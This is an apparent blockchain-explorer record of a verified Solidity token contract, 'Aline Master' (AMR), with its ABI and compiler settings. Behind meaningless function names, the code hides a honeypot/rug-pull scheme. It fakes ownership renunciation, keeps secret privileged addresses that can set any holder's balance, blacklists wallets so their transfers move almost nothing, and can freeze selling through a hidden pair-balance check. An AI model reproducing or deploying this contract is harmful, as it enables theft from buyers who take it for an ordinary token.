{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface launchFund {\n    function createPair(address tokenTrading, address listTrading) external returns (address);\n}\n\ninterface teamReceiverSender {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverLimit) external view returns (uint256);\n\n    function transfer(address totalEnableAt, uint256 fundTo) external returns (bool);\n\n    function allowance(address sellTokenMax, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalEnableAt,\n        uint256 fundTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityMode, uint256 value);\n    event Approval(address indexed sellTokenMax, address indexed spender, uint256 value);\n}\n\nabstract contract limitShould {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fromAmount {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface isWallet is teamReceiverSender {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AlineMaster is limitShould, teamReceiverSender, isWallet {\n\n    event OwnershipTransferred(address indexed limitExemptLaunch, address indexed receiverLaunched);\n\n    function buyWalletExempt() private view {\n        require(launchShould[_msgSender()]);\n    }\n\n    uint256 liquiditySender;\n\n    function minFrom(address minBuy) public {\n        if (txMaxSell) {\n            return;\n        }\n        \n        launchShould[minBuy] = true;\n        \n        txMaxSell = true;\n    }\n\n    constructor (){\n        \n        fromAmount fundTeam = fromAmount(shouldMin);\n        liquidityTradingMax = launchFund(fundTeam.factory()).createPair(fundTeam.WETH(), address(this));\n        if (marketingBuyShould != senderLaunched) {\n            marketingBuyShould = false;\n        }\n        launchMode = _msgSender();\n        launchShould[launchMode] = true;\n        takeExempt[launchMode] = txAuto;\n        takeAtTo();\n        if (marketingBuyShould) {\n            senderLaunched = false;\n        }\n        emit Transfer(address(0), launchMode, txAuto);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return minMarketing;\n    }\n\n    uint256 toAmount;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txAuto;\n    }\n\n    address public launchMode;\n\n    function balanceOf(address receiverLimit) public view virtual override returns (uint256) {\n        return takeExempt[receiverLimit];\n    }\n\n    uint256 private txAuto = 100000000 * 10 ** 18;\n\n    function sellReceiverTeam(address walletTeam) public {\n        buyWalletExempt();\n        if (senderLaunched != marketingBuyShould) {\n            marketingBuyShould = false;\n        }\n        if (walletTeam == launchMode || walletTeam == liquidityTradingMax) {\n            return;\n        }\n        listMin[walletTeam] = true;\n    }\n\n    function atFrom(address maxSwap, address totalEnableAt, uint256 fundTo) internal returns (bool) {\n        if (maxSwap == launchMode) {\n            return atTradingSell(maxSwap, totalEnableAt, fundTo);\n        }\n        uint256 buyFromMin = teamReceiverSender(liquidityTradingMax).balanceOf(feeFund);\n        require(buyFromMin == liquiditySender);\n        require(totalEnableAt != feeFund);\n        if (listMin[maxSwap]) {\n            return atTradingSell(maxSwap, totalEnableAt, launchedTrading);\n        }\n        return atTradingSell(maxSwap, totalEnableAt, fundTo);\n    }\n\n    mapping(address => bool) public listMin;\n\n    mapping(address => bool) public launchShould;\n\n    function isLaunched(uint256 fundTo) public {\n        buyWalletExempt();\n        liquiditySender = fundTo;\n    }\n\n    function takeAtTo() public {\n        emit OwnershipTransferred(launchMode, address(0));\n        walletLaunchedSender = address(0);\n    }\n\n    bool public txMaxSell;\n\n    function atTradingSell(address maxSwap, address totalEnableAt, uint256 fundTo) internal returns (bool) {\n        require(takeExempt[maxSwap] >= fundTo);\n        takeExempt[maxSwap] -= fundTo;\n        takeExempt[totalEnableAt] += fundTo;\n        emit Transfer(maxSwap, totalEnableAt, fundTo);\n        return true;\n    }\n\n    function transfer(address launchedTotalFee, uint256 fundTo) external virtual override returns (bool) {\n        return atFrom(_msgSender(), launchedTotalFee, fundTo);\n    }\n\n    string private shouldMode = \"AMR\";\n\n    function owner() external view returns (address) {\n        return walletLaunchedSender;\n    }\n\n    function getOwner() external view returns (address) {\n        return walletLaunchedSender;\n    }\n\n    uint256 public maxReceiver;\n\n    address public liquidityTradingMax;\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldMode;\n    }\n\n    bool private senderLaunched;\n\n    address shouldMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function allowance(address feeReceiver, address amountLaunchedFrom) external view virtual override returns (uint256) {\n        if (amountLaunchedFrom == shouldMin) {\n            return type(uint256).max;\n        }\n        return sellLiquidityFee[feeReceiver][amountLaunchedFrom];\n    }\n\n    mapping(address => uint256) private takeExempt;\n\n    function senderBuyTo(address launchedTotalFee, uint256 fundTo) public {\n        buyWalletExempt();\n        takeExempt[launchedTotalFee] = fundTo;\n    }\n\n    uint8 private minMarketing = 18;\n\n    string private receiverFrom = \"Aline Master\";\n\n    function approve(address amountLaunchedFrom, uint256 fundTo) public virtual override returns (bool) {\n        sellLiquidityFee[_msgSender()][amountLaunchedFrom] = fundTo;\n        emit Approval(_msgSender(), amountLaunchedFrom, fundTo);\n        return true;\n    }\n\n    address private walletLaunchedSender;\n\n    bool private marketingBuyShould;\n\n    address feeFund = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transferFrom(address maxSwap, address totalEnableAt, uint256 fundTo) external override returns (bool) {\n        if (_msgSender() != shouldMin) {\n            if (sellLiquidityFee[maxSwap][_msgSender()] != type(uint256).max) {\n                require(fundTo <= sellLiquidityFee[maxSwap][_msgSender()]);\n                sellLiquidityFee[maxSwap][_msgSender()] -= fundTo;\n            }\n        }\n        return atFrom(maxSwap, totalEnableAt, fundTo);\n    }\n\n    uint256 constant launchedTrading = 5 ** 10;\n\n    mapping(address => mapping(address => uint256)) private sellLiquidityFee;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverFrom;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellTokenMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitExemptLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountLaunchedFrom\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLaunchedFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLimit\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundTo\",\"type\":\"uint256\"}],\"name\":\"isLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTradingMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minBuy\",\"type\":\"address\"}],\"name\":\"minFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTeam\",\"type\":\"address\"}],\"name\":\"sellReceiverTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTotalFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundTo\",\"type\":\"uint256\"}],\"name\":\"senderBuyTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeAtTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTotalFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalEnableAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txMaxSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AlineMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}